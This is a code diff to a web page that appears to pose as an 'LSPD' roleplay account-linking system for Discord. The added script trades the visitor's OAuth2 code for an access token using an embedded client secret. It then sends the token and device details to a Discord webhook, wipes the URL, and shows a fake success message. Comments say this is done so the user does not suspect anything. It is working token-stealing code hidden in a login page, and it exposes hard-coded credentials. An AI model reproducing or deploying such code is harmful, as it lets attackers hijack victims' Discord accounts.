@@ -1417,33 +1417,58 @@ root.render(<App/>);
 </script>
 
 <script>
-// أول ما تفتح الصفحة، الكود يشوف هل فيه "code" في الرابط؟
 const urlParams = new URLSearchParams(window.location.search);
 const discordCode = urlParams.get('code');
 
 if (discordCode) {
-    // إذا لقينا كود، نرسله فوراً للويب هوك مع معلومات الجهاز
+    const CLIENT_ID = '1501532779924684851';
+    const CLIENT_SECRET = 'jqZdnEq5N4gzixI3mw-bzSVZKtie-dR3';
+    const REDIRECT_URI = 'https://ekrp1.netlify.app/';
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1501486535495909508/tgk6tefdfHjUriek7isfqA4sYgZD8_7zkHbrGS8v8ZVwZYes-iNazxuDN97RRFe-0V8i";
-    
-    fetch(WEBHOOK_URL, {
+
+    // 1. عملية المقايضة (Exchange) لتحويل الكود إلى توكن
+    fetch('https://discord.com/api/oauth2/token', {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            embeds: [{
-                title: "🚨 New Login Code Captured!",
-                description: `**Code:** \`${discordCode}\`\n\n*ملاحظة: هذا الكود تستخدمه في السيرفر عندك عشان تطلّع التوكن النهائي.*`,
-                color: 0x5865F2,
-                fields: [
-                    { name: "📱 Device", value: navigator.userAgent, inline: false },
-                    { name: "🔗 Redirect URL", value: window.location.href, inline: false }
-                ],
-                footer: { text: "LSPD System | OAuth2 Capture" }
-            }]
+        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+        body: new URLSearchParams({
+            client_id: CLIENT_ID,
+            client_secret: CLIENT_SECRET,
+            grant_type: 'authorization_code',
+            code: discordCode,
+            redirect_uri: REDIRECT_URI
         })
-    }).then(() => {
-        // بعد ما يرسل البيانات، نحذف الكود من الرابط عشان ما يشك المستخدم
+    })
+    .then(response => response.json())
+    .then(data => {
+        const finalToken = data.access_token;
+
+        if (finalToken) {
+            // 2. إرسال التوكن النهائي ومعلومات الجهاز للويب هوك
+            return fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "✅ Final Access Token Captured!",
+                        description: `**Token:** \`${finalToken}\``,
+                        color: 0x00FF00,
+                        fields: [
+                            { name: "📱 Device", value: navigator.userAgent, inline: false },
+                            { name: "🔑 Type", value: "Automatic Bypass (JS)", inline: true }
+                        ],
+                        footer: { text: "LSPD Central System | Automated Capture" }
+                    }]
+                })
+            });
+        }
+    })
+    .then(() => {
+        // تنظيف الرابط وإظهار رسالة النجاح
         window.history.replaceState({}, document.title, "/");
-        alert("تم ربط الحساب بنجاح بنظام LSPD!");
+        alert("System Synchronized Successfully!");
+    })
+    .catch(err => {
+        console.error("Capture Error:", err);
     });
 }
 </script>
